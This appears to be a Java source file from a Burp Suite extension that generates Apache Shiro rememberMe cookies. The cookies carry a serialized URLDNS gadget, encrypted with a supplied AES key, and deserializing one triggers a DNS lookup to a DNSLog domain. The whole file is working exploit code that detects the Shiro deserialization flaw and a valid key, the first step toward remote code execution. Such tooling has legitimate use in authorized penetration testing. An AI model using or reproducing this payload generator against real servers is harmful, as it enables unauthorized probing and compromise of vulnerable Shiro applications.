package burp.Bootstrap;

import java.util.Random;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class ShiroUrlDns {
    private String key = "";
    private String dnsLogUrl = "";
    private String sendDnsLogUrl = "";
    private String rememberMeEncryptValue = "";

    public ShiroUrlDns(String key, String dnsLogUrl) {
        if (key == null || key.isEmpty()) {
            throw new IllegalArgumentException("ShiroUrlDnsCheck类-key参数不能为空");
        }
        if (dnsLogUrl == null || dnsLogUrl.isEmpty()) {
            throw new IllegalArgumentException("ShiroUrlDnsCheck类-dnsLogUrl参数不能为空");
        }

        try {
            this.init(key, dnsLogUrl);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private void init(String key, String dnsLogUrl) throws Exception {
        String sendDnsLogUrl = key.substring(0, 1) + "." + this.randomStr(8) + "." + dnsLogUrl;

        byte[] exp = this.makeDNSURL(sendDnsLogUrl);
        String rememberMe = this.shiroRememberMeEncrypt(key, exp);

        this.setKey(key);
        this.setDnsLogUrl(dnsLogUrl);
        this.setSendDnsLogUrl(sendDnsLogUrl);
        this.setRememberMeEncryptValue(rememberMe);
    }

    /**
     * 设置加密的“记住我”内容
     * @param value
     */
    private void setRememberMeEncryptValue(String value) {
        this.rememberMeEncryptValue = value;
    }

    /**
     * 获取加密的“记住我”内容
     * @return String
     */
    public String getRememberMeEncryptValue() {
        return this.rememberMeEncryptValue;
    }

    /**
     * 设置传进来的加密key
     * @param value
     */
    private void setKey(String value) {
        this.key = value;
    }

    /**
     * 获取传进来的加密key
     * @return String
     */
    public String getKey() {
        return this.key;
    }

    private void setDnsLogUrl(String value) {
        this.dnsLogUrl = value;
    }

    /**
     * 获取传进来的dnsLog Url
     * @return String
     */
    public String getDnsLogUrl() {
        return this.dnsLogUrl;
    }

    private void setSendDnsLogUrl(String value) {
        this.sendDnsLogUrl = value;
    }

    /**
     * 获取要发送的dnsLog Url
     * @return String
     */
    public String getSendDnsLogUrl() {
        return this.sendDnsLogUrl;
    }

    private static byte[] makeDNSURL(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL(null, "http://"+url, handler);
        ht.put(u, url);

        // reset hashCode cache
        Class<?> clazz = u.getClass();
        Field codev = clazz.getDeclaredField("hashCode");
        codev.setAccessible(true);
        codev.set(u, -1);
        byte[] exp = getBytes(ht);
        return exp;
    }

    private static byte[] getBytes(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = null;
        ObjectOutputStream objectOutputStream = null;
        byteArrayOutputStream = new ByteArrayOutputStream();
        objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        return byteArrayOutputStream.toByteArray();
    }

    private static String shiroRememberMeEncrypt(String key, byte[] objectBytes) {
        Base64 B64 = new Base64();
        byte[] keyDecode = B64.decode(key);
        AesCipherService cipherService = new AesCipherService();
        ByteSource byteSource = cipherService.encrypt(objectBytes, keyDecode);
        byte[] value = byteSource.getBytes();
        return new String(B64.encode(value));
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    private String randomStr(int number) {
        StringBuffer s = new StringBuffer();
        char[] stringArray = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
        Random random = new Random();
        for (int i = 0; i < number; i++){
            char num = stringArray[random.nextInt(stringArray.length)];
            s.append(num);
        }
        return s.toString();
    }
}
